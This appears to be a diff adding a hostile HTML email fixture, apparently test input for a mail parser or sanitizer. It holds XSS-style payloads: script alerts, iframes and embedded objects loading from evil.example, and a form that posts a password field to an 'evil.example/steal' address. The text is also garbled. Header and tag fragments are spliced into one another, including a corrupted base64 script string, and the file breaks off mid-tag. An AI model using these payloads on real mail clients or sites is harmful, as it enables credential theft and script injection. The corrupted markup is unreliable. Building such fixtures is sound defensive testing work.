@@ -1,0 +1,22 @@
+From: "Mallory =?utf-8?b?w4lsw6g=?=" <mallory@example.com>
+To: victim@example.org, "Group": a@b.c, d@e.f;
+Subject: =?iso-8859-1?q?Hostile_=E9?= fixture
+Message-ID: <hoContent-Language: m>
+In-Reply-To: <parent@example.com>
+References: <root@example.com> <parent@example.com>
+Date: Tue, 09 Nov 2026 10:00:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<!DOCTYPEipt:alert(17)">formaction</a>
+<iframe src="https://evil.example/frame"></iframe>
+<iframe srcdoc="<script>alert(18)</script>"></iframe>
+<frameset><frame src="https://evil.example/f"></frameset>
+<object data="https://evil.example/x.swf"><param name=movie value=x></object>
+<embed src="https://evil.example/x.swf">
+<applet code="X.class"></applet>
+<form action="https://evil.example/steal" method=post>
+  <input type=password name=p><input type=image src="https://evil.example/i.png">
+  <button formaction="https://e/html;base64,PHNjcmlwdD5hTo: bGVydCgxNSk8L3NjcmlwdD4=">data</a>
+<a hrefswf"><param name=movie value=x></object>
+<embed src
